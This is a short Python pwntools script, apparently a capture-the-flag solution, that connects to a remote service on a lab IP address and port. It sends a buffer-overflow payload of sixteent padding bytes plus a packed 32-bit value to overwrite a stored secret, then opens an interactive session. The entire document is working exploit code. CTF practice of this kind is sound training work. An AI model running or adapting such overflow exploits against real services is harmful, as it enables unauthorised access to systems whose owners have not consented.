from pwn import *

io = remote("10.10.175.247", "33434")

# io = process("./docker/pwn")

delim = b"Please input the secret: \n"

payload = b"a"*16 + p32(0x61634143)

io.sendlineafter(delim, payload)

io.interactive()

